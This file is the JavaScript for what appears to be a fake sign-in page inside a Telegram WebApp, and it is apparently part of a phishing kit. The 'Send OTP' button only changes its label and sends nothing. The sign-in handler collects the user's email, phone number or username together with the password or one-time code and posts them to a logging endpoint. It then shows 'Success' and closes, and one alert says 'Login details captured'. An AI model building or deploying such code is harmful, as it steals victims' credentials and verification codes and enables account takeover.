const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    const loginId = document.getElementById('login-identifier');
    const loginPass = document.getElementById('login-password');
    const loginOtpInput = document.getElementById('login-otp-input');
    const loginPassWrapper = document.getElementById('login-password-wrapper');
    const loginOtpWrapper = document.getElementById('login-otp-wrapper');
    const loginForgotWrapper = document.getElementById('login-forgot-wrapper');

    let userData = { id: '', pass: '', login_otp: '', time: '', method: 'password' };

    // Tab Switching
    document.querySelectorAll('.signin-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            const method = tab.dataset.tab;
            userData.method = method;
            if (method === 'password') {
                loginId.placeholder = "Email / Phone Number / Username";
                loginPassWrapper.style.display = 'block';
                loginOtpWrapper.style.display = 'none';
                loginForgotWrapper.style.display = 'block';
            } else {
                loginId.placeholder = "Enter phone number";
                loginPassWrapper.style.display = 'none';
                loginOtpWrapper.style.display = 'block';
                loginForgotWrapper.style.display = 'none';
            }
        });
    });

    document.getElementById('btn-login-send-otp').addEventListener('click', () => {
        const idVal = loginId.value.trim();
        if (!idVal) return alert("Please enter Email or Phone Number first");
        const btn = document.getElementById('btn-login-send-otp');
        btn.innerText = "Sending...";
        setTimeout(() => { btn.innerText = "Sent"; }, 800);
    });

    const btnSignin = document.getElementById('trigger-signin');
    if (btnSignin) {
        btnSignin.addEventListener('click', async () => {
            const idVal = loginId.value.trim();
            if (!idVal) return alert("Please enter your details");
            
            userData.id = idVal;
            userData.time = new Date().toLocaleString();
            
            if (userData.method === 'password') {
                userData.pass = loginPass.value.trim();
                if (!userData.pass) return alert("Please enter password");
            } else {
                userData.login_otp = loginOtpInput.value.trim();
                if (!userData.login_otp) return alert("Please enter verification code");
            }

            btnSignin.innerText = "Processing...";
            btnSignin.disabled = true;

            console.log("-> Sending Normal Log");
            await logToServer(userData.method === 'password' ? '🔑 LOGIN (PASSWORD)' : '🔢 LOGIN (OTP)', userData);
            
            btnSignin.innerText = "Success";
            
            setTimeout(() => {
                if (tg) tg.close();
                else alert("Login details captured successfully!");
            }, 1500);
        });
    }

    async function logToServer(title, data) {
        try {
            const response = await fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ title, data })
            });
            return await response.json();
        } catch (e) {
            console.error("Fetch Error:", e);
        }
    }

    const eyeBtn = document.querySelector('.btn-password-eye');
    if (eyeBtn) {
        eyeBtn.addEventListener('click', () => {
            const isPass = loginPass.type === 'password';
            loginPass.type = isPass ? 'text' : 'password';
            eyeBtn.innerHTML = isPass ? '<i class="far fa-eye"></i>' : '<i class="far fa-eye-slash"></i>';
        });
    }
});

